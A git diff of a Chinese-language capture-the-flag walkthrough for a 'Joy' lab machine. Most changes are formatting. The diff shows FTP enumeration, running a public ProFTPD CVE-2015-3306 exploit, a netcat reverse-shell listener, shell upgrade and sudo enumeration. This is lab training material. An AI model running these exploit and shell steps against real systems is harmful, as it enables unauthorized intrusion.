@@ -125,6 +125,7 @@ Nmap done: 1 IP address (1 host up) scanned in 61.97 seconds
 <br>
 先从ftp入手， 因为他能够让我匿名登录
 <br>
+
 ```
 ftp 192.168.146.62
 Connected to 192.168.146.62.
@@ -240,17 +241,21 @@ pondskater
 Lock down this machine!
 ```
 
-<br>在目前以上的信息暂时没有用, 继续往下探索
+<br>
+在目前以上的信息暂时没有用, 继续往下探索
 <br>
 访问一下web界面看看
 
 ![Img](../FILES/Joy/img-20220714143305.png)
-<br>有一个ossec目录, 点进去是一个事件管理平台
+<br>
+有一个ossec目录, 点进去是一个事件管理平台
 
 ![Img](../FILES/Joy/img-20220714143417.png)
 
-<br> 通过左上角的logo可以看到这是一个OSSEC的平台, 并且版本为0.8, 那我们searchsploit看看有没有什么可利用的漏洞
-<br> 诶, 有的
+<br> 
+通过左上角的logo可以看到这是一个OSSEC的平台, 并且版本为0.8, 那我们searchsploit看看有没有什么可利用的漏洞
+<br> 
+诶, 有的
 
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
@@ -535,6 +540,7 @@ KeyboardInterrupt
 <br>没反应, 去github上面看看
 <br>原来ProFTPD是有一个CVEID的
 https://github.com/t0kx/exploit-CVE-2015-3306/
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62]
 └─$ git clone https://github.com/t0kx/exploit-CVE-2015-3306.git             
@@ -561,7 +567,9 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 └─$ 
 
 ```
+
 接下来尝试利用
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
 └─$ ./exploit.py --host 192.168.146.62 --port 21 --path "/var/www/tryingharderisjoy"
@@ -573,7 +581,6 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
                                                                                                                                                                                
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
 └─$ 
-
 ```
 
 *It's working!!!*
@@ -590,6 +597,7 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 nc并没有回显, 那就只能用php了
 <br>
 先在本地起个监听
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
 └─$ nc -nvlp 4444                 
@@ -687,6 +695,7 @@ www-data@JOY:/var/www/tryingharderisjoy/ossec$
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 <br>切换到Patrick
+
 ```
 www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
 su patrick
@@ -718,6 +727,7 @@ patrick@JOY:/var/www/tryingharderisjoy/ossec$
 
 ```
 <br> 通过sudo -l我们可以知道当前用户是否拥有sudo的权限去执行某文件
+
 ```
 patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l 
 sudo -l
